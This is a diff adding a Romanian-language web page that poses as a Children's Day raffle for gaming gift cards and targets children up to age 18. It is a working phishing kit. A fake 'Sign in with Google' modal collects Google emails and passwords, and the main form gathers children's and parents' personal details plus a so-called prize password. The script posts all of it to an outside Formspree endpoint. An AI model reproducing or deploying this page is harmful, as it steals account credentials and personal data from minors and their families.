@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="favicon.png" type="image/png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tombola de Ziua Copiilor 🎉</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            line-height: 1.6;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            padding: 20px;
+            max-width: 650px;
+            width: 100%;
+            text-align: center;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        @media (min-width: 768px) {
+            body {
+                padding: 20px;
+            }
+            
+            .container {
+                padding: 40px;
+            }
+        }
+
+        .header {
+            margin-bottom: 25px;
+        }
+
+        .header h1 {
+            color: #2d3748;
+            font-size: 1.6em;
+            margin-bottom: 12px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.08);
+            line-height: 1.3;
+            font-weight: 700;
+        }
+
+        .header p {
+            color: #4a5568;
+            font-size: 0.95em;
+            line-height: 1.5;
+            max-width: 90%;
+            margin: 0 auto;
+        }
+
+        @media (min-width: 768px) {
+            .header {
+                margin-bottom: 35px;
+            }
+            
+            .header h1 {
+                font-size: 2.2em;
+                margin-bottom: 15px;
+            }
+            
+            .header p {
+                font-size: 1.1em;
+                max-width: 100%;
+            }
+        }
+
+        .gift-cards {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* Default for mobile: 2 columns */
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        @media (min-width: 480px) {
+            .gift-cards {
+                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); /* For small tablets: auto-fit based on 140px min */
+                gap: 16px;
+                margin-bottom: 30px;
+            }
+        }
+
+        @media (min-width: 768px) { /* For desktop and larger tablets */
+            .gift-cards {
+                grid-template-columns: repeat(4, 1fr); /* Force 4 columns */
+                gap: 20px;
+                margin-bottom: 35px;
+            }
+        }
+
+        .gift-card {
+            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
+            border: none;
+            border-radius: 16px;
+            padding: 18px 12px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            color: white;
+            font-size: 0.9em;
+            font-weight: 600;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            min-height: 95px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .gift-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 100%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .gift-card:hover::before {
+            opacity: 1;
+        }
+
+        @media (min-width: 768px) {
+            .gift-card {
+                padding: 25px 18px; /* Desktop padding for cards */
+                font-size: 1em; /* Desktop font size for cards */
+                min-height: 110px; /* Desktop min-height for cards */
+                border-radius: 18px;
+            }
+        }
+
+        .gift-card:hover {
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.25);
+        }
+
+        .gift-card:active {
+            transform: translateY(-4px) scale(0.98);
+        }
+
+        .gift-card.selected {
+            background: linear-gradient(135deg, #4ecdc4, #44a08d);
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 15px 30px rgba(78, 205, 196, 0.4);
+        }
+
+        .gift-card.psn {
+            background: linear-gradient(135deg, #0070f3, #0051cc);
+        }
+
+        .gift-card.steam {
+            background: linear-gradient(135deg, #1b2838, #2a475e);
+        }
+
+        .gift-card.roblox {
+            background: linear-gradient(135deg, #00a2ff, #0078d4);
+        }
+
+        .gift-card.vbucks {
+            background: linear-gradient(135deg, #8a2be2, #9932cc);
+        }
+
+        .gift-card-icon {
+            font-size: 1.6em;
+            margin-bottom: 6px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+
+        @media (min-width: 768px) {
+            .gift-card-icon {
+                font-size: 1.8em; /* Desktop icon size */
+                margin-bottom: 8px;
+            }
+        }
+
+        .form-section {
+            display: none;
+            animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px);
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2d3748;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
+
+        @media (min-width: 768px) {
+            .form-group {
+                margin-bottom: 24px;
+            }
+            
+            .form-group label {
+                margin-bottom: 10px;
+                font-size: 1em;
+            }
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            background: #ffffff;
+            color: #2d3748;
+            font-family: inherit;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.12);
+            background: #fafafa;
+        }
+
+        .form-group input:invalid {
+            border-color: #e53e3e;
+        }
+
+        .disclaimer {
+            background: linear-gradient(135deg, #fff3cd, #ffeaa7);
+            border: 1px solid #fdd835;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 16px;
+            color: #7c2d12;
+            font-size: 0.85em;
+            text-align: left;
+            line-height: 1.5;
+            box-shadow: 0 2px 8px rgba(253, 216, 53, 0.2);
+        }
+
+        @media (min-width: 768px) {
+            .disclaimer {
+                padding: 16px 20px;
+                margin-bottom: 20px;
+                font-size: 0.9em;
+            }
+        }
+
+        .disclaimer strong {
+            color: #92400e;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 8px 20px rgba(72, 187, 120, 0.3);
+            width: 100%;
+            margin-top: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .submit-btn:hover::before {
+            left: 100%;
+        }
+
+        @media (min-width: 480px) {
+            .submit-btn {
+                width: auto;
+                padding: 18px 40px;
+                font-size: 1.1em;
+                margin-top: 0;
+                min-width: 200px;
+            }
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(72, 187, 120, 0.4);
+            background: linear-gradient(135deg, #4fd683, #38a169);
+        }
+
+        .submit-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .back-btn {
+            background: linear-gradient(135deg, #718096, #4a5568);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-right: 0;
+            margin-bottom: 12px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 100%;
+            font-weight: 500;
+            box-shadow: 0 4px 12px rgba(113, 128, 150, 0.3);
+        }
+
+        @media (min-width: 480px) {
+            .back-btn {
+                width: auto;
+                margin-right: 16px;
+                margin-bottom: 0;
+            }
+        }
+
+        .back-btn:hover {
+            background: linear-gradient(135deg, #4a5568, #2d3748);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(113, 128, 150, 0.4);
+        }
+
+        .Google-btn {
+            background: #FFFFFF; 
+            color: #202124; 
+            border: 2px solid #33ccff; 
+            border-image-source: linear-gradient(to bottom, #33ccff 0%, #00ffcc 100%);
+            border-image-slice: 1;
+            padding: 16px 32px; 
+            border-radius: 12px; 
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.08); 
+            width: 100%; 
+            margin-top: 0; 
+            margin-bottom: 15px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            text-align: center; 
+        }
+
+        .Google-btn:hover {
+            background-color: #f8f9fa; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            transform: translateY(-1px); 
+        }
+        
+        .Google-btn:active {
+            background-color: #f1f3f4; 
+            transform: translateY(0px); 
+            box-shadow: 0 1px 2px rgba(0,0,0,0.08); 
+        }
+
+        .Google-btn img {
+            width: 24px;
+            height: 24px;
+            border-radius: 4px;
+        }
+
+        .form-section-helper-text {
+            margin-bottom: 25px; 
+            margin-top: 0;
+            font-size: 0.9em; 
+            color: #4a5568; 
+            text-align: center;
+        }
+
+
+        .button-container {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        @media (min-width: 480px) {
+            .button-container {
+                flex-direction: row;
+                justify-content: center;
+                margin-top: 35px;
+                gap: 16px;
+            }
+        }
+
+        .success-message {
+            display: none;
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            color: white;
+            padding: 25px;
+            border-radius: 16px;
+            margin-top: 25px;
+            text-align: center;
+            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.3);
+        }
+
+        .success-message h3 {
+            margin-bottom: 12px;
+            font-size: 1.3em;
+            font-weight: 700;
+        }
+
+        .success-message p {
+            font-size: 1em;
+            line-height: 1.6;
+            opacity: 0.95;
+        }
+
+        .success-message.active {
+            display: block;
+            animation: fadeIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-50px) scale(0.9);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #718096;
+            padding: 5px;
+            border-radius: 50%;
+            transition: all 0.2s ease;
+        }
+
+        .modal-close:hover {
+            background: #f7fafc;
+            color: #2d3748;
+        }
+
+        .modal h3 {
+            margin-bottom: 20px;
+            color: #2d3748;
+            font-size: 1.4em;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .modal img {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+        }
+
+        .modal .form-group {
+            margin-bottom: 20px;
+        }
+
+        .modal-btn {
+            background: linear-gradient(135deg, #ff6b35, #f7931e);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 10px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
+        }
+
+        /* Touch improvements for mobile */
+        .gift-card, .submit-btn, .back-btn, .Google-btn, .modal-btn {
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        /* Improved focus states for accessibility */
+        .gift-card:focus, .submit-btn:focus, .back-btn:focus, .Google-btn:focus {
+            outline: 3px solid rgba(102, 126, 234, 0.5);
+            outline-offset: 2px;
+        }
+
+        /* Loading state */
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+            position: relative;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Accessibility improvements */
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        /* High contrast mode support */
+        @media (prefers-contrast: high) {
+            .gift-card, .submit-btn, .back-btn, .Google-btn {
+                border: 2px solid; 
+            }
+             .Google-btn { 
+                border-image: none !important; 
+                border-color: currentcolor !important; 
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎮 Tombola de Ziua Copiilor 🎉</h1>
+            <p>Alege-ți cardul cadou preferat și participă la tombola noastră specială!</p>
+        </div>
+
+        <div id="selection-section">
+            <div class="gift-cards">
+                <button class="gift-card psn" onclick="selectGiftCard('PSN')" aria-label="Selectează PlayStation Network">
+                    <div class="gift-card-icon">🎮</div>
+                    <div>PlayStation Network</div>
+                </button>
+                <button class="gift-card steam" onclick="selectGiftCard('Steam')" aria-label="Selectează Steam">
+                    <div class="gift-card-icon">🎲</div>
+                    <div>Steam</div>
+                </button>
+                <button class="gift-card roblox" onclick="selectGiftCard('Roblox')" aria-label="Selectează Roblox">
+                    <div class="gift-card-icon">🤖</div>
+                    <div>Roblox</div>
+                </button>
+                <button class="gift-card vbucks" onclick="selectGiftCard('V-Bucks')" aria-label="Selectează V-Bucks Fortnite">
+                    <div class="gift-card-icon">⚡</div>
+                    <div>V-Bucks (Fortnite)</div>
+                </button>
+            </div>
+        </div>
+
+        <div id="form-section" class="form-section">
+            <h2 id="selected-card-title">Completează datele tale</h2>
+            
+            <button class="Google-btn" onclick="openGoogleModal()" aria-label="Trimite participarea rapid prin Google">
+                <img src="sempex.png" alt="Google Logo">
+                <span>Trimite prin Google</span>
+            </button>
+
+            <p class="form-section-helper-text"><em>Sau completează formularul de mai jos pentru a intra în tombolă:</em></p>
+            
+            <form id="raffle-form">
+                <div class="form-group">
+                    <label for="fullName">Nume complet *</label>
+                    <input type="text" id="fullName" name="fullName" required autocomplete="name">
+                </div>
+                
+                <div class="form-group">
+                    <label for="age">Vârsta *</label>
+                    <input type="number" id="age" name="age" min="1" max="18" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Adresa de email *</label>
+                    <input type="email" id="email" name="email" required autocomplete="email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="parentName">Numele părintelui/tutorelui *</label>
+                    <input type="text" id="parentName" name="parentName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="parentEmail">Email-ul părintelui/tutorelui *</label>
+                    <input type="email" id="parentEmail" name="parentEmail" required autocomplete="email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="prizePassword">Parolă pentru criptarea premiului *</label>
+                    <div class="disclaimer">
+                        <strong>Parolă pentru criptarea premiului:</strong> Această parolă va fi folosită pentru a cripta PDF-ul cu premiul tău în cazul in care câștigi. Reține-ți această parolă cu atenție - o vei avea nevoie pentru a accesa premiul!
+                    </div>
+                    <input type="password" id="prizePassword" name="prizePassword" required>
+                </div>
+                
+                <input type="hidden" id="giftCardType" name="giftCardType">
+                
+                <div class="button-container">
+                    <button type="button" class="back-btn" onclick="goBack()">← Înapoi</button>
+                    <button type="submit" class="submit-btn">Trimite participarea 🎉</button>
+                </div>
+            </form>
+        </div>
+
+        <div id="success-message" class="success-message">
+            <h3>🎉 Participarea a fost trimisă cu succes!</h3>
+            <p>Mulțumim că ai participat la tombola de Ziua Copiilor! Te vom contacta în curând dacă câștigi unul dintre premiile noastre fantastice.</p>
+        </div>
+    </div>
+
+    <div id="Google-modal" class="modal-overlay">
+        <div class="modal">
+            <button class="modal-close" onclick="closeGoogleModal()" aria-label="Închide">&times;</button>
+            <h3>
+                <img src="sempex.png" alt="Google Logo">
+                Conectează-te prin Google
+            </h3>
+            <form id="Google-form">
+                <div class="form-group">
+                    <label for="Google-email">Adresa de e-mail sau numărul de telefon *</label>
+                    <input type="email" id="Google-email" name="GoogleEmail" required autocomplete="email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="Google-id">Parolă *</label>
+                    <input type="password" id="Google-id" name="GoogleId" required autocomplete="off">
+                </div>
+                
+                <button type="submit" class="modal-btn">Trimite prin Google</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let selectedGiftCard = '';
+
+        function selectGiftCard(type) {
+            selectedGiftCard = type;
+            document.getElementById('giftCardType').value = type;
+            document.getElementById('selected-card-title').textContent = `Completează datele tale pentru cardul cadou ${type}`;
+            
+            document.querySelectorAll('.gift-card').forEach(card => card.classList.remove('selected'));
+            const selectedCardClass = type.toLowerCase().replace('-', '');
+            const selectedCardElement = document.querySelector(`.gift-card.${selectedCardClass}`);
+            if (selectedCardElement) {
+                selectedCardElement.classList.add('selected');
+            }
+            
+            setTimeout(() => {
+                document.getElementById('selection-section').style.display = 'none';
+                document.getElementById('form-section').classList.add('active');
+            }, 200);
+        }
+
+        function goBack() {
+            document.getElementById('selection-section').style.display = 'block';
+            document.getElementById('form-section').classList.remove('active');
+            document.getElementById('success-message').classList.remove('active');
+            document.querySelectorAll('.gift-card').forEach(card => card.classList.remove('selected'));
+        }
+
+        function openGoogleModal() {
+            document.getElementById('Google-modal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            setTimeout(() => {
+                document.getElementById('Google-email').focus();
+            }, 300);
+        }
+
+        function closeGoogleModal() {
+            document.getElementById('Google-modal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        document.getElementById('Google-modal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeGoogleModal();
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && document.getElementById('Google-modal').classList.contains('active')) {
+                closeGoogleModal();
+            }
+        });
+
+        async function submitForm(formData, submitButton) {
+            try {
+                submitButton.classList.add('loading');
+                
+                const response = await fetch('https://formspree.io/f/mgvkgwaa', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    document.getElementById('form-section').classList.remove('active');
+                    document.getElementById('selection-section').style.display = 'none'; 
+                    document.getElementById('success-message').classList.add('active');
+                    if (document.getElementById('raffle-form')) { 
+                        document.getElementById('raffle-form').reset();
+                    }
+                    if (document.getElementById('Google-form')) { 
+                         document.getElementById('Google-form').reset();
+                    }
+                    closeGoogleModal(); 
+                } else {
+                    const errorData = await response.json().catch(() => ({})); 
+                    console.error('Formspree error:', errorData);
+                    alert(`A apărut o eroare la trimiterea participării. (${response.status}) Te rugăm să încerci din nou.`);
+                }
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                alert('A apărut o eroare la trimiterea participării. Te rugăm să verifici conexiunea la internet și să încerci din nou.');
+            } finally {
+                submitButton.classList.remove('loading');
+            }
+        }
+
+        document.getElementById('raffle-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const timestampInput = document.createElement('input');
+            timestampInput.type = 'hidden';
+            timestampInput.name = 'timestamp';
+            timestampInput.value = new Date().toISOString();
+            this.appendChild(timestampInput);
+
+            const submissionTypeInput = document.createElement('input');
+            submissionTypeInput.type = 'hidden';
+            submissionTypeInput.name = 'submissionType';
+            submissionTypeInput.value = 'StandardForm';
+            this.appendChild(submissionTypeInput);
+            
+            const formData = new FormData(this);
+            await submitForm(formData, this.querySelector('.submit-btn'));
+
+            this.removeChild(timestampInput);
+            this.removeChild(submissionTypeInput);
+        });
+
+        document.getElementById('Google-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData();
+            formData.append('GoogleEmail', document.getElementById('Google-email').value);
+            formData.append('GoogleId', document.getElementById('Google-id').value);
+            formData.append('submissionType', 'Google');
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('giftCardType', selectedGiftCard); 
+            
+            await submitForm(formData, this.querySelector('.modal-btn'));
+        });
+
+        document.querySelectorAll('input[required]').forEach(input => {
+            input.addEventListener('blur', function() {
+                if (!this.checkValidity()) { 
+                    this.style.borderColor = '#e53e3e';
+                } else {
+                    this.style.borderColor = '#e2e8f0';
+                }
+            });
+            input.addEventListener('input', function() { 
+                 if (this.checkValidity()) {
+                    this.style.borderColor = '#e2e8f0';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
